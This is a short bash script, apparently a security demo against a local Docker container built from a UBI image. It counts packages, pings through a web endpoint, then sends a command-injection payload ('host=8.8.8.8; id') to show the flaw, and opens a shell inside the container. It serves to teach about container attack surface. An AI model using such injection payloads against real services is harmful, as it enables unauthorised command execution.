#!/usr/bin/env bash
# Run from inside the 03-demo-ubi/ folder.
# Build: docker build -f Dockerfile -t 03-demo-ubi ..
# Run:   docker run -d --name 03-demo-ubi -p 5003:5000 03-demo-ubi

set -euo pipefail

TARGET="http://localhost:5003"
sep() { echo; echo "─────────────────────────────────────────────"; }

sep
echo "STEP 1: Package count"
docker exec 03-demo-ubi rpm -qa | wc -l

sep
echo "STEP 2: Normal ping"
curl -s "$TARGET/ping?host=8.8.8.8" | python3 -m json.tool

sep
echo "STEP 3: Exploit -- command injection"
echo "        Payload: ?host=8.8.8.8; id"
curl -s "$TARGET/ping?host=8.8.8.8%3B+id" | python3 -m json.tool

sep
echo "STEP 4: Shell present"
docker exec 03-demo-ubi ls -la /bin/sh

sep
echo "STEP 5: Drop into a shell"
docker exec -it 03-demo-ubi /bin/bash
